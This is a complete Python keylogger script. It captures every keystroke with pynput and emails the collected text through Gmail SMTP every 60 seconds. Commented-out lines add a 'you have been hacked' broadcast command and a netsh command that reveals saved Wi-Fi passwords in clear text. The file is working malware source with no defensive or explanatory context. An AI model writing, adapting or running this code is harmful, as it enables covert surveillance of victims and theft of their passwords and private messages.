import subprocess,smtplib
import json 
import threading
import pynput.keyboard

result=""
def send_mail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()
    

#command = "%SystemRoot%\Sysnative\msg.exe * you have been hacked"
#command = "netsh wlan show profile Sting_Killer key=clear"
#command = "ifconfig"


def process_key_press(key):
	global result
	try:
		result = result + str(key.char)
	except AttributeError:
		if key == key.space:
		 	result = result + " "
		else:
			result = result + " " + str(key) + " "


def report():
	global result
	send_mail("mailid.com","mailpassword",result)
	print(result)
	result = ""
	timer = threading.Timer(60,report)
	timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
	report()
	keyboard_listener.join()
